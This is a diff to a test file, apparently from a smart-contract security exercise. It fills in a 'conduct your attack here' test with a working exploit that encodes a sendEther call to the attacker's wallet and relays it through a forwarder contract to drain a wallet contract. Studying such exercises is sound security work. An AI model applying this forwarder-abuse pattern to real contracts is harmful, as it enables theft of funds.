@@ -36,7 +36,12 @@ describe(NAME, function () {
       );
     });
 
-    it("conduct your attack here", async function () {});
+        it("conduct your attack here", async function () {
+            let ABI = ["function sendEther(address destination, uint256 amount)"];
+            let iface = new ethers.utils.Interface(ABI);
+            let data = iface.encodeFunctionData("sendEther", [attackerWallet.address, value]);
+            forwarderContract.connect(attackerWallet).functionCall(walletContract.address, data);
+        });
 
     after(async function () {
       const attackerWalletBalanceAfter = await ethers.provider.getBalance(
